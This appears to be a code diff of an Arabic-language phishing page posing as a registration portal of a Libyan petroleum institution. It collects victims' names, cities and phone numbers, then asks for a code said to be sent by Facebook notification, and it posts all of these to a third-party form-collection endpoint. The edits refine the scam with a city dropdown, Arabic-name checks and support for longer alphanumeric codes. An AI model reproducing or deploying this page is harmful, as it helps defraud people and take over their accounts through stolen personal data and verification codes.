@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>المؤسسة الوطنيــة</title>
-
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
@@ -18,7 +17,6 @@
       margin: 0;
       direction: rtl;
     }
-
     .container {
       background: #fff;
       border-radius: 20px;
@@ -28,37 +26,25 @@
       max-width: 420px;
       box-sizing: border-box;
       text-align: center;
-      z-index: 1;
     }
-
-    .logo-container {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
     .logo-container img {
       width: 90px;
       height: 90px;
       object-fit: contain;
-      margin: 0 auto;
       display: block;
+      margin: 0 auto 8px;
     }
-
     .logo-container p {
-      margin-top: 8px;
       font-weight: 700;
       color: #003366;
       font-size: 16px;
     }
-
     h2 {
       margin-bottom: 25px;
       color: #003366;
       font-weight: 900;
-      font-family: Arial, Helvetica, sans-serif;
       font-size: 32px;
     }
-
     label {
       display: block;
       margin-bottom: 8px;
@@ -66,29 +52,23 @@
       color: #222;
       text-align: right;
     }
-
-    input[type="tel"],
-    input[type="text"] {
+    input[type="tel"], input[type="text"], select {
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
       border-radius: 10px;
       border: 1.8px solid #bbb;
       margin-bottom: 18px;
-      transition: border-color 0.3s ease;
       box-sizing: border-box;
       font-family: inherit;
     }
-
-    input:focus {
+    input:focus, select:focus {
       border-color: gold;
       outline: none;
     }
-
-    input:disabled {
+    input:disabled, select:disabled {
       background-color: #f2f2f2;
     }
-
     button {
       width: 40%;
       padding: 12px;
@@ -99,28 +79,15 @@
       color: #002147;
       cursor: pointer;
       font-weight: bold;
-      font-family: Calibri, sans-serif;
-      transition: background-color 0.3s ease;
-      margin-bottom: 15px;
     }
-
     button:hover:not(:disabled) {
       background-color: #e6c200;
     }
-
-    button:disabled {
-      background-color: #c2a300;
-      cursor: not-allowed;
-    }
-
     #timer {
-      text-align: center;
-      font-weight: 600;
       color: red;
-      margin-bottom: 20px;
+      font-weight: 600;
       min-height: 24px;
     }
-
     .otp-container {
       display: flex;
       justify-content: center;
@@ -128,7 +95,6 @@
       margin-bottom: 10px;
       direction: ltr;
     }
-
     .otp-input {
       width: 44px;
       height: 52px;
@@ -139,22 +105,16 @@
       border-radius: 10px;
       background-color: #f9f9f9;
       color: #002147;
-      outline: none;
-      transition: border-color 0.2s ease;
     }
-
     .otp-input:focus {
       border-color: gold;
     }
-
     .autofill-hint {
-      text-align: center;
       font-size: 14px;
       color: #555;
       margin-top: 5px;
       margin-bottom: 20px;
     }
-
     .error {
       color: red;
       font-size: 14px;
@@ -164,62 +124,68 @@
   </style>
 </head>
 <body>
-  <div id="main-content">
-    <div class="container">
-      <div class="logo-container">
-        <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
-        <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-      </div>
-
-      <h2>تسجيل الدخول</h2>
-
-      <form id="phoneForm" onsubmit="return sendPhone(event);">
-        <label for="fullname">الاسم الثلاثي:</label>
-        <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
-
-        <label for="address">العنوان:</label>
-        <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-        <label for="phone">رقم الهاتف:</label>
-        <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-        <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
-        <div id="timer"></div>
-      </form>
-
-      <form id="codeForm" onsubmit="return sendCode(event);">
-        <div id="codeField" style="display: none;">
-          <label style="font-weight: bold; color: #003366; font-size: 18px;">
-            جاري إرسال الكود عبر إشعار فيسبوك
-          </label>
-
-          <div class="otp-container" id="otpInputs">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
-          </div>
-
-          <div class="autofill-hint">
-            سيتم إدخال الكود تلقائيًا عند وصول إشعار من فيسبوك إذا كان مدعومًا من المتصفح.
-          </div>
-
-          <div id="errorMessage" class="error"></div>
-          <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-
-          <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-            جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
-          </div>
-        </div>
-      </form>
+  <div class="container">
+    <div class="logo-container">
+      <img src="uy.jpeg" alt="شعار المؤسسة" />
+      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
     </div>
+
+    <h2>تسجيل الدخول</h2>
+    <form id="phoneForm" onsubmit="return sendPhone(event);">
+      <label for="fullname">الاسم الثلاثي:</label>
+      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+
+      <label for="address">المدينة:</label>
+      <select id="address" name="address" required>
+        <option value="">اختر المدينة</option>
+        <option>طرابلس</option>
+        <option>بنغازي</option>
+        <option>مصراتة</option>
+        <option>سبها</option>
+        <option>الزاوية</option>
+        <option>زليتن</option>
+        <option>سرت</option>
+        <option>طبرق</option>
+        <option>الخمس</option>
+        <option>درنة</option>
+        <!-- أضف باقي المناطق حسب الحاجة -->
+      </select>
+
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" />
+
+      <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
+      <div id="timer"></div>
+    </form>
+
+    <form id="codeForm" onsubmit="return sendCode(event);">
+      <div id="codeField" style="display: none;">
+        <label>جاري إرسال الكود عبر إشعار فيسبوك</label>
+
+        <div class="otp-container" id="otpInputs">
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+          <input type="text" class="otp-input" maxlength="1" />
+        </div>
+
+        <div class="autofill-hint">سيتم إدخال الكود تلقائيًا إذا كان مدعومًا من المتصفح</div>
+
+        <div id="errorMessage" class="error"></div>
+        <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+
+        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
+          جاري معالجة طلبك، يمكن المراجعة خلال 7 إلى 30 يومًا.
+        </div>
+      </div>
+    </form>
   </div>
 
   <script>
-    let countdownInterval;
-
     function startTimer(duration) {
       let timeLeft = duration;
       const timerDisplay = document.getElementById('timer');
@@ -227,11 +193,11 @@
       const phoneInput = document.getElementById('phone');
       timerDisplay.style.display = 'block';
       updateTimer(timeLeft);
-      countdownInterval = setInterval(() => {
+      const interval = setInterval(() => {
         timeLeft--;
         updateTimer(timeLeft);
         if (timeLeft <= 0) {
-          clearInterval(countdownInterval);
+          clearInterval(interval);
           timerDisplay.style.display = 'none';
           sendPhoneBtn.disabled = false;
           phoneInput.disabled = false;
@@ -248,67 +214,21 @@
 
     function sendPhone(event) {
       event.preventDefault();
+      const fullnameInput = document.getElementById('fullname');
+      const fullname = fullnameInput.value.trim();
+      const address = document.getElementById('address');
       const phoneInput = document.getElementById('phone');
-      const fullname = document.getElementById('fullname').value;
-      const address = document.getElementById('address').value;
 
-      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
-        phoneInput.focus();
-        return false;
-      }
-
-      const payload = { fullname, address, phone: phoneInput.value };
-      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
-        phoneInput.disabled = true;
-        document.getElementById('sendPhoneBtn').disabled = true;
-        document.getElementById('codeField').style.display = 'block';
-        startTimer(480);
-      })
-      .catch(error => {
-        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
-        console.error(error);
-      });
-
-      return false;
-    }
-
-    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
-      input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-      });
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
-
-    function sendCode(event) {
-      event.preventDefault();
-      const codeInputs = document.querySelectorAll('.otp-input');
-      const code = Array.from(codeInputs).map(input => input.value).join('');
-      const errorMessage = document.getElementById('errorMessage');
-      const processingMessage = document.getElementById('processingMessage');
-      const sendCodeBtn = document.getElementById('sendCodeBtn');
-      errorMessage.textContent = '';
-
-      if (code.length !== 6 || !/^[0-9]{6}$/.test(code)) {
-        errorMessage.textContent = 'يرجى إدخال الكود المكون من 6 أرقام بشكل صحيح.';
+      if (!/^[\u0621-\u064A\s]{8,}$/.test(fullname)) {
+        alert("يرجى إدخال اسم ثلاثي مكون من 8 حروف عربية على الأقل.");
+        fullnameInput.focus();
         return false;
       }
 
       const payload = {
-        phone: document.getElementById('phone').value,
-        code
+        fullname,
+        address: address.value,
+        phone: phoneInput.value
       };
 
       fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
@@ -316,21 +236,58 @@
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload)
       })
+      .then(response => {
+        if (!response.ok) throw new Error();
+        fullnameInput.disabled = true;
+        address.disabled = true;
+        phoneInput.disabled = true;
+        document.getElementById('sendPhoneBtn').disabled = true;
+        document.getElementById('codeField').style.display = 'block';
+        startTimer(480);
+      })
+      .catch(() => alert('تعذر إرسال البيانات. حاول لاحقاً.'));
+    }
+
+    document.querySelectorAll('.otp-input').forEach((input, i, arr) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && i < arr.length - 1) arr[i + 1].focus();
+      });
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) arr[i - 1].focus();
+      });
+    });
+
+    function sendCode(event) {
+      event.preventDefault();
+      const inputs = document.querySelectorAll('.otp-input');
+      const code = Array.from(inputs).map(i => i.value).join('');
+      const errorMessage = document.getElementById('errorMessage');
+      const sendCodeBtn = document.getElementById('sendCodeBtn');
+      const processingMessage = document.getElementById('processingMessage');
+      errorMessage.textContent = '';
+
+      if (code.length < 6 || code.length > 8 || !/^[a-zA-Z0-9]+$/.test(code)) {
+        errorMessage.textContent = 'يرجى إدخال كود من 6 إلى 8 خانات من الأرقام أو الأرقام مع الأحرف.';
+        return false;
+      }
+
+      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ phone: document.getElementById('phone').value, code })
+      })
       .then(async response => {
         const data = await response.json();
         if (response.ok && data.success !== false) {
           sendCodeBtn.style.display = 'none';
           processingMessage.style.display = 'block';
         } else {
-          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
+          errorMessage.textContent = '❌ الكود غير صحيح. حاول مرة أخرى.';
         }
       })
-      .catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-        console.error(error);
+      .catch(() => {
+        errorMessage.textContent = '⚠️ حدث خطأ في الاتصال بالخادم.';
       });
-
-      return false;
     }
   </script>
 </body>
